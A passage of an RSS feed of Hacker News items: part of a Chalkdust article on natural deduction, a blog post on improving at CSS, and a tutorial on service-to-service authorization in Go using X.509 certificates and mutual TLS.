<div id="attachment_15542"><p><a href="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png"><img aria-describedby="caption-attachment-15542" loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png?resize=195%2C134" alt="" width="195" height="134" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png?w=383 383w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png?resize=300%2C206 300w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/10.png?resize=1%2C1 1w" sizes="(max-width: 195px) 100vw, 195px" data-recalc-dims="1"></a></p><p id="caption-attachment-15542">Bottom introduction ($\bot$I): if $P$ and $\neg P$, then $\bot$.</p></div>
<p>We‚Äôre then able to make use of $\bot$ through <em>negation introduction</em>, which states that if from $P$ we can prove $\bot$, then we can conclude $\neg P$. This is reasonable; if $P$ being true led to a contradiction, then $P$ isn‚Äôt true, so $\neg P$ is.</p>
<div id="attachment_15543"><p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png"><img aria-describedby="caption-attachment-15543" loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?resize=228%2C231" alt="" width="228" height="231" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?w=443 443w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?resize=295%2C300 295w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?resize=1%2C1 1w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/11.png?resize=45%2C45 45w" sizes="(max-width: 228px) 100vw, 228px" data-recalc-dims="1"></a></p><p id="caption-attachment-15543">Negation introduction ($\neg$I): if from $P$ we can prove $\bot$, then $\neg P$.</p></div>
<p>Finally we have <em>negation elimination</em>. This one is a nice easy way to end: it says that if we know $\neg \neg P$, then we can conclude $P$. If something isn‚Äôt not true, then it must be true!</p>
<div id="attachment_15532"><p><a href="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png"><img aria-describedby="caption-attachment-15532" loading="lazy" src="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png?resize=173%2C78" alt="" width="173" height="78" srcset="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png?w=372 372w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png?resize=300%2C135 300w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2020/10/12.png?resize=2%2C1 2w" sizes="(max-width: 173px) 100vw, 173px" data-recalc-dims="1"></a></p><p id="caption-attachment-15532">Negation elimination ($\neg$E): if $\neg\neg P$, then $P$.</p></div>
<p>And with that, we have completed (one kind of) natural deduction, laying out a framework for proofs based on undeniable principles so that we can be <em>completely</em> confident in our results.</p>
<p>Now, you may be wondering, hey, maths is about numbers and shapes and functions and vector fields, but all we‚Äôve been working with are $P$s and $Q$s! Not a single $n$ or $x$, let alone an $f$, has been written so far!</p>
<p>Fear not! Purely logical systems such as natural deduction are key ingredient for building typical maths. For example, to define numbers, we may first extend to <a href="https://www.quora.com/What-is-the-precise-difference-between-propositional-and-predicate-logic" target="_blank" rel="noopener noreferrer">predicate logic</a>, then construct the naturals (via the <em><a href="https://en.wikipedia.org/wiki/Peano_axioms" target="_blank" rel="noopener noreferrer">Peano axioms</a></em>), which we‚Äôll use to make the <a href="http://www.math.hawaii.edu/~pavel/syllabi_old/aluffi_321/NZ.pdf" target="_blank" rel="noopener noreferrer">integers</a> and the <a href="https://people.clas.ufl.edu/groisser/files/rationals.pdf" target="_blank" rel="noopener noreferrer">rationals</a> (via equivalence classes), then finally the reals (via <em><a href="https://en.wikipedia.org/wiki/Dedekind_cut" target="_blank" rel="noopener noreferrer">Dedekind cuts</a></em>).</p>
<p>So, in fact, we still we get to work with all the maths we‚Äôre used to! Plus, due to the use of natural deduction, we have the added benefit of being confident about what we‚Äôre doing at every layer of abstraction!</p>
<p><strong>Predicate and propositional logic:</strong> The logic we‚Äôve been building, with $\land$, $\lor$, $\Rightarrow$, $\neg$, and $\bot$, is known as <em>propositional</em> or <em>zeroth-order logic</em>. <em>Predicate</em> or <em>first-order logic</em> is an extension of propositional logic wherein our statements ($P$, $Q$, $X$, etc) may be parametrised. So as well as having $H$ mean that ‚ÄòI am hungry‚Äô, we may also have $\mathcal H(x)$ mean that ‚Äò$x$ is hungry‚Äô. Additionally, predicate logic includes two <em>quantifiers</em>, $\forall$ and $\exists$, which respectively mean ‚Äòfor every‚Äô and ‚Äòthere exists‚Äô: $\forall x \mathcal H(x)$ means that everyone is hungry, and $\exists x \mathcal H(x)$ means that (at least) one person is hungry.</p>
<h2>So what?</h2>
<p>If you‚Äôre anything like I was at age 17, or anything like how I portrayed you in the beginning of this article, you‚Äôre drooling right now. It‚Äôs like all of your fantasies regarding rigour and precision have been heard and answered by divine mathematicians.</p>
<p>But maybe you‚Äôre not intrinsically motivated by rigour, so you‚Äôre less excited by natural deduction. Which is fine! I‚Äôm not hurt. Maybe a little bit. Or maybe you just feel that this is overkill‚Äîdid you <em>really</em> need all this work to know that $2 \neq 1$? Or maybe you‚Äôre not convinced that these rules are correct; perhaps you don‚Äôt agree that from $\neg \neg P$ we can conclude $P$.</p>
<p><strong>Excluding the middle:</strong> If you don‚Äôt agree, you are not alone! That $\neg \neg P$ entails $P$ is a consequence of a rule called the <em>law of excluded middle</em>, which states that $P \lor \neg P$. (This law is built-in to the system of natural deduction that we created.) Some mathematicians (<a href="https://en.wikipedia.org/wiki/Intuitionistic_logic" target="_blank" rel="noopener noreferrer">the <em>intuitionists</em> or <em>constructionists</em></a>) reject the law of excluded middle, thus also forfeiting that $\neg \neg P$ entails $P$. One reason to question the law of excluded middle is that it allows us to state that something exists without stating what it is. For instance, we are able to <a href="https://math.stackexchange.com/a/104121/243259" target="_blank" rel="noopener noreferrer">prove that an irrational number raised to the power of an irrational number can be rational</a>, but <em>without</em> giving an actual example. If we reject the law of excluded middle, then all such proofs must <em>actually construct</em> an example.</p>
<p>Still, I posit, natural deduction is worth your time. Because we‚Äôve been so rigorous in building the system up, we gain the benefit of knowing <em>exactly what we‚Äôre talking about</em>. Before establishing such precision, we may have used $P \Rightarrow Q$, but without a sense of ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/">http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/</a></em></p>]]>
            </description>
            <link>http://chalkdustmagazine.com/features/how-can-we-tell-that-2%e2%89%a01/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24948031</guid>
            <pubDate>Sat, 31 Oct 2020 00:16:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get Better at CSS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24947963">thread link</a>) | @taphangum
<br/>
October 30, 2020 | https://planflow.dev/blog/how-to-get-better-at-css | <a href="https://web.archive.org/web/*/https://planflow.dev/blog/how-to-get-better-at-css">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The key reason why you (and likely most developers) struggle with CSS, is that you underestimate it.</p><p>Underestimating CSS leads to a strange feeling of tediousness when writing it, which makes having to deal with it a laborious and seemingly unrewarding task. Style by style, div by div, media query by media query. Having to make endless small tweaks in what feels like an open-ended ‚Äòdesign‚Äô process with no direction at all can feel like torture to a development-oriented mind.</p><p>Not to mention a complete lack of debugging tools and methods available for when things go wrong.</p><p>This underestimation is a subset of a problem that we developers tend to have with design in general. In short, we don‚Äôt think it‚Äôs that important. We don‚Äôt understand or appreciate its <em>meaning</em>.</p><p>In reality, CSS is as complicated, maybe more so, as any programming language or framework you will ever come across.</p><p>But the general feeling that it is an afterthought within the development process overall, only adds fuel to fire of the thought that leads you to feel that it is tedious.</p><p>The best way to start to get better at it then, is to gain a new appreciation for it, as a 'hard', technical thing. Which it is.</p><p><strong>You do this by reframing how you see it.</strong></p><p>You can start to learn to like CSS by understanding it from a problem solving technical aspect. As an act of 'constructing' a page rather than 'designing' it. By <a target="_blank" title="https://simpleprogrammer.com/information-architecture-developers-learning-design/" href="https://simpleprogrammer.com/information-architecture-developers-learning-design/">engaging the engineering side of your mind</a>.</p><p>Instead of seeing CSS as an annoying way to 'style' pages, see it instead as a visual programming language for constructing visual guides (UI's) for your user.</p><p>You don't 'style' pages, you 'construct' and 'architect' them. It sounds weird to use these words, but they have a massive effect on changing your perception of what you're doing. And that has a massive effect on your impression and willingness to learn how to do it well.</p><p>Essentially, you can properly learn CSS by transforming it in your mind from a 'styling' problem thing, to an 'engineering' problem thing.</p><p>This defeats the feeling of tedium that your mind has when you‚Äôre dealing with CSS, and over time, if applied with some of the specific additional tactics that I will explain below, leads to actually _enjoying_ the process of writing CSS.</p><h2>Tactics That Reduce CSS Tediousness &amp; Lead To CSS Enjoyment</h2><p>Once you‚Äôve started to reframe the act of utilizing CSS in your mind, and start to see it as more of a tool for an engineering problem rather than a ‚Äòdesign‚Äô problem, embers of enjoyment will start to emerge within you as you are writing your CSS. From here, you can start to add some fuel to the growing fire. </p><p>You can do this by utilizing some strategies, tools and techniques that further reduce the tediousness of CSS. </p><p><strong>Let‚Äôs go through them.</strong></p><h3>Use tediousness reducing tools, such as <a target="_blank" title="https://tailwindcss.com/" href="https://tailwindcss.com/">TailwindCSS</a>. So you can abstract CSS.</h3><p>I remember back a few years ago when the <a target="_blank" title="https://laravel.com/" href="https://laravel.com/">Laravel Framework</a> came out. PHP Programmers all over the web were fawning over it. The most common phrase I heard was that it gave programmers ‚Äútheir enjoyment of programming‚Äù back. This with a language that was notoriously derided as one that was tedious to use.</p><p>What Laravel did was abstract a lot of the annoying parts of most of these developers' workflows when writing PHP code. These developers, at this newfound higher level of abstraction, could now focus on ‚Äòcrafting‚Äô their applications, becoming ‚Äòartisans‚Äô of their code rather than simply PHP programmers.</p><p>TailwindCSS does the same thing for CSS. Instead of moving from one file to another to define your styles, Tailwind uses standard default class presets that allow you to write your CSS, essentially directly onto your HTML elements. This <a target="_blank" title="https://news.ycombinator.com/item?id=24034619" href="https://news.ycombinator.com/item?id=24034619">might sound weird</a> at first, but in the end, actually results in a LOT of saved time in development.</p><p>Over time, it, along with other tools, such as Flexbox, also massively increases enjoyment, as you start to intuitively ‚Äòcraft‚Äô and construct pages at a higher level of abstraction, rather than simply ‚Äòstyle‚Äô them.</p><p><strong>Fun fact</strong><strong>:</strong> The creator of TailwindCSS, <a target="_blank" title="https://twitter.com/adamwathan" href="https://twitter.com/adamwathan">Adam Wathan</a> actually started out as a Laravel Developer, so maybe that enthusiasm crossed over to his other project areas.</p><p><strong>EDIT</strong><strong>:</strong> I recently came across a very nice feature in Firefox that helps in debugging overflow issues (one of the most common CSS problems). You can see it in action <a target="_blank" title="https://twitter.com/violasong/status/1314406711696912386" href="https://twitter.com/violasong/status/1314406711696912386">here</a>.</p><h3>Understand how to solve common problems in CSS</h3><p>Because of the lack of debugging tools that are currently available for CSS. Most of debugging within it largely consists of cross-referencing ways that others have dealt with the issue you‚Äôre currently facing.</p><p>While this is likely not an uncommon practice in your development workflow (its why StackOverflow exists), it is very time consuming if it is the ONLY way that you can debug. </p><p>One way around this issue is to become familiar with the most common pattern of problems that occur within CSS, and then try to build a repository of solutions to those problems in your mind over time. This sounds simple enough but it very dramatically decreases tedium and increases productivity and speed of development, which ultimately increases your enjoyment.</p><p>For example, one of the most common issues, as referenced in the post drawing, is ‚Äòoverflow‚Äô of elements occurring within the page. Sometimes causing the entire page itself to overflow at certain screen sizes. A tutorial like this, outlines the best way to solve this problem.</p><p><strong>Sidenote</strong><strong>:</strong> We are creating a short ebook that deals with this problem, by outlining these most common CSS problems and their solutions, you can sign up for notification of this here: <a target="_blank" title="https://forms.gle/tXRMnpyUZiFmvZwK8" href="https://forms.gle/tXRMnpyUZiFmvZwK8">How To Debug CSS</a>.</p><h3>Master layouts and positioning in CSS (the most tedious aspect of it)</h3><p>As a follow-on to the above point on simply gaining an understanding of the most common aspects of the CSS writing process, the most common of these in terms of general page creation, is that of simply layout out a page, and its elements and making sure that they are positioned and aligned properly. </p><p>The best way to approach problems in a way that solves them most effectively is in an 80/20 way. Mastery of layouts and positioning is the 20% that leads to the 80% of results with CSS. And what will have the most dramatic effect on reducing the tediousness of your CSS writing process.</p><p>Using tools such as Flexbox, as is mentioned above, also makes layouts and positioning twice as easy, once you understand the fundamentals behind it. </p><p>Overall, it‚Äôs with this knowledge that you may start to enjoy and view the process as ‚Äòconstructing‚Äô pages, rather than simply ‚Äòstyling‚Äô them.</p><h3>Practice regularly until it becomes second nature</h3><p>One simple thing that I found, as I started to implement some of the tactics above into my own workflow, was that as I became more proficient in writing CSS and it started to become second nature, my enjoyment of it also started to increase, which lead to a positive feedback loop that kept increasing my overall ability.</p><p>This is a very positive flywheel that I highly encourage. Once you‚Äôve started to change your mindset about CSS and use the right tools to abstract a lot of the tediousness out of it, practicing it regularly is then like adding jet fuel to your workflow. Eventually, CSS will become something you look forward to, rather than an afterthought that you try to avoid.</p></div></div>]]>
            </description>
            <link>https://planflow.dev/blog/how-to-get-better-at-css</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947963</guid>
            <pubDate>Sat, 31 Oct 2020 00:01:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Service to Service Authorization in Go Using X.509 Certificates]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24947756">thread link</a>) | @regeda
<br/>
October 30, 2020 | https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/ | <a href="https://web.archive.org/web/*/https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
      <p>Service-to-service authentication is the ability of one service to identify its clients. It‚Äôs a good idea to ensure that a service accepts requests only from specified services. But how to implement access controls (authorization)?</p>
<p>For instance, only the service <code>cart</code> is granted to bind to the service <code>invoice</code>, and only two services <code>invoice</code> and <code>billing</code> are granted to bind to the service <code>payment</code>.</p>
<p><img src="https://regeda.me/s2s_seq.svg" alt="Alt text"></p>
<p>Firstly, we must decide on the unique key of service, the attribute of a caller to be verified by a recipient. Do you think the IP address or hostname is manageable in the infrastructure at scale? It‚Äôs challenging in a multi-tenant environment where different personas can park successively the same network identity in a short period.</p>
<p>Let‚Äôs consider an <a href="https://searchsecurity.techtarget.com/definition/X509-certificate">X.509 certificate</a> which is a widely used standard for network security and identity verification.</p>
<h2 id="give-a-secure-identity-to-components">Give a secure identity to components</h2>
<p>We could go over the long way to <a href="https://www.semurity.com/how-to-setup-your-own-certificate-authority-ca-using-openssl/">set up your own Certificate Authority and sign a certificate using OpenSSL</a>. For the sake of simplicity, I use the <a href="https://github.com/cloudflare/cfssl"><strong>sfssl</strong></a> toolkit for certificates management.</p>
<h3 id="installation">Installation</h3>
<div><pre><code data-lang="shell">go get -u github.com/cloudflare/cfssl/cmd/...
</code></pre></div><h3 id="configuration">Configuration</h3>
<p>The <code>sfssl</code> toolkit expects two files to generate a certificate:</p>
<ul>
<li><code>config.json</code> ‚Äì settings for the issuer</li>
<li><code>csr.json</code> ‚Äì request for a certificate.</li>
</ul>
<p>The file <code>config.json</code> contains settings for the Certificate Authority. We are interested in the <code>profiles</code> section for our certificates:</p>
<div><pre><code data-lang="json">{
  <span>"signing"</span>: {
    <span>"profiles"</span>: {
      <span>"service"</span>: {
        <span>"usages"</span>: [
          <span>"signing"</span>,
          <span>"key encipherment"</span>,
          <span>"server auth"</span>,
          <span>"client auth"</span>
        ],
        <span>"expiry"</span>: <span>"720h"</span>
      }
    }
  }
}
</code></pre></div><p>The file <code>csr/ca.json</code> contains the request for the Certificate Authority certificate:</p>
<div><pre><code data-lang="json">{
  <span>"CN"</span>: <span>"Demo Citadel"</span>,
  <span>"names"</span>: [
    {
      <span>"C"</span>: <span>"US"</span>,
      <span>"L"</span>: <span>"San Francisco"</span>,
      <span>"O"</span>: <span>"Citadel, Inc."</span>,
      <span>"ST"</span>: <span>"CA"</span>
    }
  ],
  <span>"ca"</span>: {
    <span>"expiry"</span>: <span>"86700h"</span>
  }
}
</code></pre></div><p>The file <code>csr/service.json</code> contains the request for the service certificate:</p>
<div><pre><code data-lang="json">{
  <span>"CN"</span>: <span>"citadel.xyz"</span>,
  <span>"names"</span>: [
    {
      <span>"C"</span>: <span>"US"</span>,
      <span>"L"</span>: <span>"San Francisco"</span>,
      <span>"O"</span>: <span>"Citadel, Inc."</span>,
      <span>"ST"</span>: <span>"CA"</span>
    }
  ]
}
</code></pre></div><h3 id="generating">Generating</h3>
<p>The Certificate Authority certificate:</p>
<div><pre><code data-lang="shell">cfssl gencert -initca csr/ca.json | cfssljson -bare pki/ca ‚Äì
</code></pre></div><p>Meantime, we reached the important step and have to define the unique attribute of service. Usually, the service has a name and it belongs to a company. Hence we need to stamp the identity <code>citadel:srv-invoice</code> into the handcrafted X.509 certificate along with the server hostname <code>host1.infra.citadel.net</code>:</p>
<div><pre><code data-lang="shell">cfssl gencert <span>\
</span><span></span>-ca pki/ca.pem -ca-key pki/ca-key.pem <span>\
</span><span></span>-config config.json <span>\
</span><span></span>-profile service <span>\
</span><span></span>-hostname <span>'host1.infra.citadel.net,citadel:srv-invoice'</span> <span>\
</span><span></span>csr/service.json | cfssljson -bare pki/srv-invoice-host1 -
</code></pre></div><p>Let‚Äôs check the resulted alternative name from the issued certificate:</p>
<div><pre><code data-lang="shell">openssl x509 -in pki/srv-invoice-host1.pem -text | grep -A <span>1</span> <span>'Alternative Name'</span>
</code></pre></div><pre><code>X509v3 Subject Alternative Name:
    DNS:host1.infra.citadel.net, URI:citadel:srv-invoice
</code></pre><p>üíö The service identity <code>citadel:srv-invoice</code> successfully assigned to the server <code>host1.infra.citadel.net</code>.</p>
<h2 id="consume-the-service-identity-in-go">Consume the service identity in Go</h2>
<p>Fortunately, the callback <code>VerifyConnection</code> of <a href="https://golang.org/pkg/crypto/tls/#Config"><code>tls.Config</code></a> was introduced in Go 1.15:</p>
<div><pre><code data-lang="go"><span>package</span> <span>tls</span>

<span>type</span> <span>Config</span> <span>struct</span> {
    <span>VerifyConnection</span> <span>func</span>(<span>ConnectionState</span>) <span>error</span>
}
</code></pre></div><p>The Go documentation says: if the function returns an error, the TLS handshake is aborted. Hence we are enabled to restrain the TLS connection permit by own.</p>
<p>For testing purposes, we make the simplest access control by a prefix:</p>
<div><pre><code data-lang="go"><span>var</span> <span>errAccessForbidden</span> = <span>errors</span>.<span>New</span>(<span>"access forbidden"</span>)

<span>func</span> <span>verifyPeerPrefix</span>(<span>prefix</span> <span>string</span>) <span>func</span>(<span>tls</span>.<span>ConnectionState</span>) <span>error</span> {
	<span>return</span> <span>func</span>(<span>s</span> <span>tls</span>.<span>ConnectionState</span>) <span>error</span> {
		<span>// The first element is the leaf certificate
</span><span></span>		<span>// that the connection is verified against.
</span><span></span>		<span>for</span> <span>_</span>, <span>uri</span> <span>:=</span> <span>range</span> <span>s</span>.<span>PeerCertificates</span>[<span>0</span>].<span>URIs</span> {
			<span>if</span> <span>strings</span>.<span>HasPrefix</span>(<span>uri</span>.<span>String</span>(), <span>prefix</span>) {
				<span>return</span> <span>nil</span>
			}
		}
		<span>return</span> <span>errAccessForbidden</span>
	}
}
</code></pre></div><p>Then prepare <code>tls.Config</code> for the server listener. Necessarily, the callback should be provided in conjunction with the mutual TLS authentication enabled:</p>
<div><pre><code data-lang="go"><span>cfg</span> <span>:=</span> <span>tls</span>.<span>Config</span>{
	<span>ClientAuth</span>:       <span>tls</span>.<span>RequireAndVerifyClientCert</span>,
	<span>VerifyConnection</span>: <span>verifyPeerPrefix</span>(<span>"citadel:srv"</span>),
}
</code></pre></div><blockquote>
<p>The constant <code>tls.RequireAndVerifyClientCert</code> of <a href="https://golang.org/pkg/crypto/tls/#ClientAuthType"><code>tls.ClientAuthType</code></a> indicates the server will request a client certificate and if none is provided the session will terminate, if the client certificate cannot be verified (a corresponding CA (root) certificate cannot be found) the session will also be terminated.</p>
</blockquote>
<p>The full source of the example server:</p>
<div><pre><code data-lang="go"><span>package</span> <span>main</span>

<span>import</span> (
	<span>"crypto/tls"</span>
	<span>"crypto/x509"</span>
	<span>"errors"</span>
	<span>"flag"</span>
	<span>"io"</span>
	<span>"io/ioutil"</span>
	<span>"log"</span>
	<span>"net"</span>
	<span>"strings"</span>
)

<span>var</span> (
	<span>listenAddr</span>   = <span>flag</span>.<span>String</span>(<span>"listen-addr"</span>, <span>"127.0.0.1:8080"</span>, <span>"Listen address for incoming connections"</span>)
	<span>certFile</span>     = <span>flag</span>.<span>String</span>(<span>"cert"</span>, <span>""</span>, <span>"Path to a PEM-encoded certificate"</span>)
	<span>keyFile</span>      = <span>flag</span>.<span>String</span>(<span>"key"</span>, <span>""</span>, <span>"Path to a private key matching the PEM-encoded certificate"</span>)
	<span>caFile</span>       = <span>flag</span>.<span>String</span>(<span>"ca"</span>, <span>""</span>, <span>"Path to a bundle of root certificates"</span>)
	<span>acceptPrefix</span> = <span>flag</span>.<span>String</span>(<span>"accept-prefix"</span>, <span>""</span>, <span>"Accept client certificates only with this prefix"</span>)
)

<span>func</span> <span>main</span>() {
	<span>flag</span>.<span>Parse</span>()

	<span>caCert</span>, <span>err</span> <span>:=</span> <span>ioutil</span>.<span>ReadFile</span>(<span>*</span><span>caFile</span>)
	<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
		<span>log</span>.<span>Fatal</span>(<span>"ca cert file could not be read:"</span>, <span>err</span>)
	}
	<span>rootCAs</span> <span>:=</span> <span>x509</span>.<span>NewCertPool</span>()
	<span>if</span> !<span>rootCAs</span>.<span>AppendCertsFromPEM</span>(<span>caCert</span>) {
		<span>log</span>.<span>Fatal</span>(<span>"ca cert file could not be installed"</span>)
	}

	<span>clientCert</span>, <span>err</span> <span>:=</span> <span>tls</span>.<span>LoadX509KeyPair</span>(<span>*</span><span>certFile</span>, <span>*</span><span>keyFile</span>)
	<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
		<span>log</span>.<span>Fatal</span>(<span>"client cert could not be loaded:"</span>, <span>err</span>)
	}

	<span>cfg</span> <span>:=</span> <span>tls</span>.<span>Config</span>{
		<span>Certificates</span>:     []<span>tls</span>.<span>Certificate</span>{<span>clientCert</span>},
		<span>ClientCAs</span>:        <span>rootCAs</span>,
		<span>ClientAuth</span>:       <span>tls</span>.<span>RequireAndVerifyClientCert</span>,
		<span>MinVersion</span>:       <span>tls</span>.<span>VersionTLS12</span>,
		<span>VerifyConnection</span>: <span>verifyPeerPrefix</span>(<span>*</span><span>acceptPrefix</span>),
	}

	<span>l</span>, <span>err</span> <span>:=</span> <span>tls</span>.<span>Listen</span>(<span>"tcp"</span>, <span>*</span><span>listenAddr</span>, <span>&amp;</span><span>cfg</span>)
	<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
		<span>log</span>.<span>Fatal</span>(<span>"listen failed:"</span>, <span>err</span>)
	}

	<span>log</span>.<span>Println</span>(<span>"Listen:"</span>, <span>*</span><span>listenAddr</span>)

	<span>for</span> {
		<span>conn</span>, <span>err</span> <span>:=</span> <span>l</span>.<span>Accept</span>()
		<span>if</span> <span>err</span> <span>!=</span> <span>nil</span> {
			<span>log</span>.<span>Println</span>(<span>"ERR! accept failed:"</span>, <span>err</span>)
			<span>continue</span>
		}
		<span>go</span> <span>talk</span>(<span>conn</span>)
	}
}

<span>var</span> <span>errAccessForbidden</span> = <span>errors</span>.<span>New</span>(<span>"access forbidden"</span>)

<span>func</span> <span>verifyPeerPrefix</span>(<span>prefix</span> <span>string</span>) <span>func</span>(<span>tls</span>.<span>ConnectionState</span>) <span>error</span> {
	<span>return</span> <span>func</span>(<span>s</span> <span>tls</span>.<span>ConnectionState</span>) <span>error</span> {
		<span>// The first element is the leaf certificate
</span><span></span>		<span>// that the connection is verified against.
</span><span></span>		<span>for</span> <span>_</span>, <span>uri</span> <span>:=</span> <span>range</span> <span>s</span>.<span>PeerCertificates</span>[<span>0</span>].<span>URIs</span> {
			<span>if</span> <span>strings</span>.<span>HasPrefix</span>(<span>uri</span>.<span>String</span>(), <span>prefix</span>) {
				<span>return</span> <span>nil</span>
			}
		}
		<span>return</span> <span>errAccessForbidden</span>
	}
}

<span>func</span> <span>talk</span>(<span>conn</span> <span>net</span>.<span>Conn</span>) {
	<span>addr</span> <span>:=</span> <span>conn</span>.<span>RemoteAddr</span>()

	<span>defer</span> <span>func</span>() {
		<span>_</span> = <span>conn</span>.<span>Close</span>()
	}()

	<span>log</span>.<span>Println</span>(<span>addr</span>, <span>"connected"</span>)
	<span>_</span>, <span>err</span> <span>:=</span> <span>io</span>.<span>Copy</span>(<span>conn</span>, <span>conn</span>) <span>// send back what we get
</span><span></span>	<span>log</span>.<span>Println</span>(<span>addr</span>, <span>"disconnected:"</span>, <span>err</span>)
}
</code></pre></div><p>Run the server to accept TLS connections from the identity <code>citadel:srv-cart</code> only:</p>
<div><pre><code data-lang="shell">go run main.go -ca pki/ca.pem <span>\
</span><span></span>-cert pki/srv-invoice-host1.pem -key pki/srv-invoice-host1-key.pem <span>\
</span><span></span>-accept-prefix citadel:srv-cart
</code></pre></div><pre><code>2020/10/27 16:58:44 Listen: 127.0.0.1:8080
</code></pre><p>‚úîÔ∏è The server is ready. Let‚Äôs run the client.</p>
<p>Issue the certificate for the <code>cart</code> service:</p>
<div><pre><code data-lang="shell">cfssl gencert <span>\
</span><span></span>-ca pki/ca.pem -ca-key pki/ca-key.pem <span>\
</span><span></span>-config config.json <span>\
</span><span></span>-profile service <span>\
</span><span></span>-hostname <span>'host2.infra.citadel.net,citadel:srv-cart'</span> <span>\
</span><span></span>csr/service.json | cfssljson -bare pki/srv-cart-host2 -
</code></pre></div><p>Then run the client:</p>
<div><pre><code data-lang="shell">openssl s_client <span>\
</span><span></span>-connect 127.0.0.1:8080 <span>\
</span><span></span>-cert pki/srv-cart-host2.pem <span>\
</span><span></span>-key pki/srv-cart-host2-key.pem -CAfile pki/ca.pem
</code></pre></div><pre><code>CONNECTED(00000003)
depth=1 C = US, ST = CA, L = San Francisco, O = "Citadel, Inc.", CN = Demo Citadel
verify return:1
depth=0 C = US, ST = CA, L = San Francisco, O = "Citadel, Inc.", CN = citadel.xyz
verify return:1
---
Certificate chain
 0 s:/C=US/ST=CA/L=San Francisco/O=Citadel, Inc./CN=citadel.xyz
   i:/C=US/ST=CA/L=San Francisco/O=Citadel, Inc./CN=Demo Citadel
...
    Verify return code: 0 (ok)
---
</code></pre><p>üíö The command <code>openssl</code> is hanging and waiting for the input. It means that the client granted successfully to bind the server.</p>
<p>üòí <strong>What happens if the client identity doesn‚Äôt match the server expectations?</strong></p>
<p>Restart the server with the parameter <code>-accept-prefix citadel:srv-noname</code>. Then the same client terminates with non-zero code and the output contains the error:</p>
<div><pre><code data-lang="shell">openssl s_client <span>\
</span><span></span>-connect 127.0.0.1:8080 <span>\
</span><span></span>-cert pki/srv-cart-host2.pem <span>\
</span><span></span>-key pki/srv-cart-host2-key.pem -CAfile pki/ca.pem
</code></pre></div><pre><code>...
4613156460:error:14020412:SSL routines:CONNECT_CR_SESSION_TICKET:sslv3 alert bad certificate:/AppleInternal/BuildRoot/Library/Caches/com.apple.xbs/Sources/libressl/libressl-47.140.1/libressl-2.8/ssl/ssl_p
kt.c:1200:SSL alert number 42
4613156460:error:140200E5:SSL routines:CONNECT_CR_SESSION_TICKET:ssl handshake failure:/AppleInternal/BuildRoot/Library/Caches/com.apple.xbs/Sources/libressl/libressl-47.140.1/libressl-2.8/ssl/ssl_pkt.c:5
85:
...
</code></pre><p>üíö The server <em>declines</em> the connection because the prefix <code>citadel:srv-noname</code> doesn‚Äôt match the client identity <code>citadel:srv-cart</code>:</p>
<div><pre><code data-lang="shell">go run main.go -ca pki/ca.pem <span>\
</span><span></span>-cert pki/srv-invoice-host1.pem -key pki/srv-invoice-host1-key.pem <span>\
</span><span></span>-accept-prefix citadel:srv-noname
</code></pre></div><pre><code>2020/10/27 17:22:02 Listen: 127.0.0.1:8080
2020/10/27 17:22:10 127.0.0.1:50161 connected
2020/10/27 17:22:10 127.0.0.1:50161 disconnected: access forbidden
</code></pre><h2 id="summary">Summary</h2>
<p>Hooray! We implemented service-to-service authorization based on well-known standards (X.509 certificates and the TLS protocol) with vital features out of the box:</p>
<ul>
<li><strong>Identity issuing</strong> through the standard toolkit for generating certificates.</li>
<li><strong>Identity verification</strong> by the trusted Certificate Authority</li>
<li><strong>Identity expiration and revocation</strong>  to be confident that the temporary access or a compromised certificate have never been used for years.</li>
</ul>
<p>And the approach has the undeniable advantage to be fluently integrated into the running infrastructure leveraging the TLS protocol. For instance, traffic in Service Mesh is not only secured by TLS, but it‚Äôs also hardened by access and identity management through X.509 certificates.</p>
<p>Your home task is to ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/">https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/</a></em></p>]]>
            </description>
            <link>https://regeda.me/posts/2020-10-29-service-to-service-authorization-in-go-using-x509-certificates/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24947756</guid>
            <pubDate>Fri, 30 Oct 2020 23:15:34 GMT</pubDate>
        </item>
